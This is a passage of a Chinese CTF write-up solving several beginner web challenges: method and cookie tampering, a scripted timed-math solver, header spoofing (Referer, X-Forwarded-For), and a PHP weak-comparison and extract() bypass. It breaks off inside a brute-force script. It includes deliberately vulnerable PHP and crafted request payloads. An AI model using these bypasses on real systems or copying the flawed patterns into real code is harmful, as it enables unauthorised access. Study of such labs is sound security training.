</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">113</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">114</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">115</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// (event.keyCode == 116) || //å±è”½ F5
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">117</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F6
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">118</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F7
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">119</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">120</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F9
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">121</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F10
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">122</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F11
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span> <span class="o">==</span> <span class="mi">123</span><span class="p">)</span> <span class="o">||</span> <span class="c1">//å±è”½ F12
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">((</span><span class="nx">event</span><span class="p">.</span><span class="nx">ctrlKey</span><span class="p">)</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">keyCode</span><span class="o">==</span><span class="mi">85</span><span class="p">)))</span> <span class="c1">//Ctrl + U
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">//å…¶å®è¿˜æœ‰ Ctrl + Shift + I å’Œ Ctrl +Shift + C
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nb">window</span><span class="p">.</span><span class="nx">onhelp</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// å¦‚ä½ æ‰€è§çš„ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="c1">// èœç‹— xlykle æ˜¯æ ¹æœ¬ä¸ä¼šå†™ç½‘é¡µçš„ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="c1">// ä¿„ç½—æ–¯æ–¹å—æ˜¯ zhihu æŠ„çš„ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="c1">// js ä»£ç æ˜¯é€›åšå®¢æ—¶å·çš„ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="c1">// åªå‰© [æ•¢ æ€ æˆ‘ çš„ é©¬] æ˜¯æˆ‘è‡ªå·±æ‰¾çš„äº†ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1">// å¥—ä¸ªå¨ƒåº”è¯¥æ˜¯éš¾ä¸ä½ä½ çš„......
</span></span></span><span class="line"><span class="cl"><span class="c1">// ç®—äº†è¿˜æ˜¯ç›´æ¥ç»™å§ï¼ˆè®°å¾—å–ä¸€ä¸‹æœ¬é¢˜å½©è›‹ğŸ˜˜
</span></span></span><span class="line"><span class="cl"><span class="c1">// CNSS{Wh@t_A_Sham3le55_thI3f}
</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-signin">ğŸš© Signin</h2>
<p>æ‰“å¼€ç½‘ç«™åå‘ç°æç¤º <strong>Please Change Your Method!</strong></p>
<p>é‚£ä¹ˆæˆ‘ä»¬æŠ“åŒ…ï¼ˆè¿˜ä¸ä¼šçš„æ–°ç”Ÿå»ºè®®ä¸‹ä¸€ä¸ª Burp Suiteï¼‰åä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸º POSTï¼Œå¯ä»¥å¾—åˆ°æºç </p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/signin.jpeg"
        data-srcset="./img/signin.jpeg, ./img/signin.jpeg 1.5x, ./img/signin.jpeg 2x"
        data-sizes="auto"
        alt="./img/signin.jpeg"
        title="signin" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">!==</span><span class="s1">&#39;POST&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Please Change Your Method!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;CNSS&#34;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;CNSS&#34;</span><span class="p">]</span> <span class="o">===</span> <span class="s2">&#34;join&#34;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">((</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;web&#34;</span><span class="p">]))</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;web&#34;</span><span class="p">])</span> <span class="o">===</span> <span class="s2">&#34;like&#34;</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span><span class="s2">&#34;0&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;1&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span><span class="k">else</span><span class="p">{</span><span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é‚£ä¹ˆå¾ˆç®€å•ï¼Œåªéœ€è¦æˆ‘ä»¬æ ¹æ®è¦æ±‚ä¼ å‚æ•°å³å¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/?web=like</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">8.130.29.197:6001</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">9</span>
</span></span><span class="line"><span class="cl"><span class="n">Cache-Control</span><span class="o">:</span> <span class="l">max-age=0</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://8.130.29.197:6001</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">flag=1</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">CNSS=join
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-æ›´å‘çš„è®¡ç®—é¢˜">ğŸ”¢ æ›´å‘çš„è®¡ç®—é¢˜</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="./img/math2.jpeg"
        data-srcset="./img/math2.jpeg, ./img/math2.jpeg 1.5x, ./img/math2.jpeg 2x"
        data-sizes="auto"
        alt="./img/math2.jpeg"
        title="math2" /></p>
<p>éœ€è¦åœ¨1så†…è®¡ç®—å‡ºæ­£ç¡®ç­”æ¡ˆå¹¶æäº¤ï¼Œé€šè¿‡æºç ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°+1sçš„æŒ‰é’®æ˜¯å®‰æ…°å‰‚ï¼Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">fool</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;fool&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">eggs</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;eggs&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">fool</span><span class="p">.</span><span class="nx">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">fool</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">eggs</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="o">++</span> <span class="k">this</span><span class="p">.</span><span class="nx">count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// ä¸Šå¸å¯¹æ¯ä¸ªäººéƒ½æ˜¯å…¬å¹³çš„ï¼Œä½ ä»¬åªæœ‰ 1s çš„æ—¶é—´
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¢„æœŸè§£æ˜¯ä½¿ç”¨è„šæœ¬æäº¤ï¼ˆè„šæœ¬ä»€ä¹ˆçš„å½“ç„¶æ˜¯pyæœ€æ–¹ä¾¿äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://8.130.29.197:6003/&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">getEquation</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;&lt;p&gt;(.*?)=&lt;/p&gt;&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">formData</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;res&#34;</span><span class="p">:</span> <span class="nb">eval</span><span class="p">(</span><span class="n">getEquation</span><span class="p">)}</span>
</span></span><span class="line"><span class="cl"><span class="n">re2</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">formData</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">re2</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæäº¤æ—¶éœ€è¦ä½¿ç”¨åŒä¸€ä¸ª Sessionï¼Œä¸ç„¶ç®—å¼æ˜¯ä¼šåˆ·æ–°çš„</p>
<h2 id="-china-flag">ğŸ‡¨ğŸ‡³ China Flag</h2>
<p>è¿™é¢˜æœ‰ç‚¹åè„‘æ´é¢˜ï¼Œæ‰“å¼€é“¾æ¥åæœ‰ä¸€å¼ å¯ä»¥ç‚¹å‡»çš„å›¾ç‰‡ï¼Œç‚¹å‡»è·³è½¬åˆ° ./china.phpã€‚</p>
<p>å›æ˜¾ <strong>æˆ‘çš„æœ‹å‹ï¼Œä½ ä»å“ªå„¿æ‰¾æ¥çš„</strong>ï¼Œè”æƒ³åˆ° HTTP æŠ¥å¤´ä¸­çš„ Refererï¼Œä¿®æ”¹<code>Referer=http://8.130.29.197:6004/index.php</code></p>
<p>å›æ˜¾ <strong>ä½ çœŸçš„æ˜¯åœŸç”ŸåœŸé•¿çš„æ‹†å°¼æ–¯ğŸ´</strong>ï¼ŒæŒ‡çš„æ˜¯ä»£ç†éœ€è¦ä¸ºæœ¬åœ°ï¼Œä¿®æ”¹<code>X-Forwarded-For: 127.0.0.1</code></p>
<p>å›æ˜¾ <strong>æˆ‘ä»¬ä¸­å›½äººä¸åƒğŸå¤§äººé‚£å¥—</strong>ï¼Œè€ƒè™‘æŠ¥å¤´ä¸­ä¸­å›½äººå’ŒğŸå¤§äººçš„åŒºåˆ«å¯èƒ½æŒ‡çš„æ˜¯è¯­è¨€ï¼Œä¿®æ”¹<code>Accept-Language: zh-CN,zh;q=0.9</code>å¾—åˆ°flag</p>
<p>æœ€ç»ˆ<code>payload</code>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/china.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">8.130.29.197:6004</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">0</span>
</span></span><span class="line"><span class="cl"><span class="n">X-Forwarded-For</span><span class="o">:</span> <span class="l">127.0.0.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://8.130.29.197:6004/index.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="-trick">ğŸ¤¥ Trick</h2>
<p>è®¿é—®é¡µé¢ç›´æ¥å¾—åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">require_once</span><span class="p">(</span><span class="s2">&#34;flag.php&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$pass</span> <span class="o">=</span> <span class="s1">&#39;0e0&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$md55</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$md55</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$md55</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$md55</span><span class="p">)</span> <span class="o">==</span> <span class="nv">$pass</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$before</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;query&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$med</span> <span class="o">=</span> <span class="s1">&#39;filter&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$after</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;/</span><span class="si">$med</span><span class="s2">/&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$before</span>
</span></span><span class="line"><span class="cl">            <span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$after</span> <span class="o">===</span> <span class="nv">$med</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nv">$flag1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$verify</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;verify&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$verify</span><span class="p">)</span> <span class="o">===</span> <span class="nv">$pass</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$$verify</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>é€è¡Œå®¡è®¡ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦å°†ä¼ å…¥çš„ token è¿›è¡Œä¸¤æ¬¡ md5 åŠ å¯†å == 0e0ï¼Œè¿™é‡Œå‘ç°æ˜¯å¼±æ¯”è¾ƒ</p>
<blockquote>
<p>å¼±æ¯”è¾ƒæ—¶ï¼Œå˜é‡ç±»å‹ä¼šå¼ºåˆ¶è½¬åŒ–ï¼Œ0eå¼€å¤´çš„çº¯æ•°å­—å­—ç¬¦ä¸²ä¼šè¢«è½¬åŒ–ä¸ºç§‘å­¦è®¡æ•°æ³•æ•°å­—</p>
<p>é‚£ä¹ˆå°±æœ‰  â€˜0e1145141919810â€™ == 0e0</p>
</blockquote>
<p>è´´ä¸€ä¸‹çˆ†ç ´è„šæœ¬ï¼ˆå»ºè®®è‡ªå·±è·‘ä¸€éå—·</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc_md5</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">md5_double</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">md5</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">md5_double</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&#34;0e&#34;</span> <span class="ow">and</span> <span class="n">md5_double</span><span class="p">[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">isdigit</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">getstr</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="n">slen</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="o">==</span> <span class="n">slen</span><span class="p">):</span>
